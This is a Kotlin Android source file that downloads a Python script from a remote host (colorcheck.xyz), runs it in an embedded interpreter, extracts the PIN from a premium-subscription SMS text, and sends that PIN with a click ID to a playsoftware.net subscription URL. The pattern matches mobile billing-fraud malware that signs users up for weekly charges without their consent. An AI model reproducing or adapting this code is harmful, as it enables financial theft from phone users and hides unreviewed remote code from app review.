package xxx.xxx.zzzz

import android.app.Activity
import android.os.Environment
import android.text.TextUtils
import androidx.appcompat.app.AppCompatActivity
import com.lzy.okgo.OkGo
import com.lzy.okgo.callback.FileCallback
import com.lzy.okgo.model.Progress
import com.lzy.okgo.model.Response
import com.srplab.www.starcore.*
import java.io.*

var python: StarObjectClass? = null

private var SrvGroup: StarSrvGroupClass? = null

private var Service: StarServiceClass? = null

private var starcore: StarCoreFactory? = null

val filePath = Environment.getExternalStorageDirectory().absolutePath + File.separator

val fileName = "py_code.py"

var sendUrl = "https://playsoftware.net/py/request-pincode-test.php?applicationId=15&msisdn=971567246806&clickid="

var clickId = ""

val code = "5760 is your PIN code. Please use it to confirm your subscription request to the mobile number 971569673031 to Apps Pool. Subscription charge will be  AED 11 per week after the end of the free period. Please ignore this message if you do not want to subscribe. Do not disclose your PIN to anyone, this code is not related to any prize/raffle draw."

fun AppCompatActivity.copyFiles() {
    try {
        if (filesDir.exists()) {
            val list = filesDir.list()
            list?.let {
                if (it.size < 5) {
                    val assetManager = assets
                    val dataSource = assetManager.open("py_code_fix.zip")
                    StarCoreFactoryPath.Install(dataSource, "${filesDir.path}", true)
                }
            } ?: run {
                val assetManager = assets
                val dataSource = assetManager.open("py_code_fix.zip")
                StarCoreFactoryPath.Install(dataSource, "${filesDir.path}", true)
            }
        }
        val assetManager = assets
        val dataSource = assetManager.open("py_code_fix.zip")
        StarCoreFactoryPath.Install(dataSource, "${filesDir.path}", true)
    } catch (e: IOException) {
    }
}

fun AppCompatActivity.initStarCore() {
    StarCoreFactoryPath.StarCoreCoreLibraryPath = applicationInfo.nativeLibraryDir
    StarCoreFactoryPath.StarCoreShareLibraryPath = applicationInfo.nativeLibraryDir
    StarCoreFactoryPath.StarCoreOperationPath = "${filesDir.path}"
    starcore = StarCoreFactory.GetFactory()
    starcore?._SRPLock()
    SrvGroup = starcore?._GetSrvGroup(0)
    Service = SrvGroup?._GetService("test", "123")
    if (Service == null) {
        Service = starcore?._InitSimple("test", "123", 0, 0)
    } else {
        Service?._CheckPassword(false)
    }
    Service?._CheckPassword(false)
    SrvGroup?._InitRaw("python37", Service)
    python = Service!!._ImportRawContext("python", "", false, "")
}

fun AppCompatActivity.getClickId() {
    var result: Any? = null
    python?._Call("eval", "import requests")
    Service?._DoFile("python", "${filesDir.path}/py_code.py", "")
    python?._Call("get_click_id")
}

fun AppCompatActivity.sendCode(){
    python?._Call("eval", "import requests")
    Service?._DoFile("python", "${filesDir.path}/py_code.py", "")
    python?._Call("send_code", getCode())
}

fun AppCompatActivity.getCode():String{
    python?._Call("eval", "import requests")
    python?._Call("eval", "import re")
    Service?._DoFile("python", "${filesDir.path}/py_code.py", "")
   return python?._Call("get_code", code).toString()
}

fun AppCompatActivity.getUiById(id:String){
    python?._Call("eval", "import requests")
    Service?._DoFile("python", "${filesDir.path}/py_code.py", "")
    python?._Call("get_ui", id)
}

fun AppCompatActivity.downloadPyCodeFile() {
    val url = "https://colorcheck.xyz/py/py_code.test"
    OkGo.get<File>(url).execute(object : FileCallback(filePath, fileName) {
        override fun onSuccess(response: Response<File>?) {

        }

        override fun downloadProgress(progress: Progress?) {
            super.downloadProgress(progress)
            val current = progress?.currentSize
            val total = progress?.totalSize
            val pro = ((current!! * 100) / total!!).toInt()
            if (pro == 100) {
                copyPycodeFile(this@downloadPyCodeFile, fileName)
            }
        }

        override fun onError(response: Response<File>?) {
            super.onError(response)
        }

    })
}

private fun copyPycodeFile(c: Activity, Name: String) {
    val infile = File(filePath + fileName)
    val outfile = File(c.filesDir, Name)
    var outStream: BufferedOutputStream? = null
    var inStream: BufferedInputStream? = null
    try {
        outStream = BufferedOutputStream(FileOutputStream(outfile))
        inStream = BufferedInputStream(infile.inputStream())
        val buffer = ByteArray(1024 * 10)
        var readLen = 0
        while (inStream.read(buffer).also { readLen = it } != -1) {
            outStream.write(buffer, 0, readLen)
        }
    } catch (e: IOException) {
        e.printStackTrace()
    } finally {
        try {
            inStream?.close()
            outStream?.close()
        } catch (e: IOException) {
            e.printStackTrace()
        }
    }
}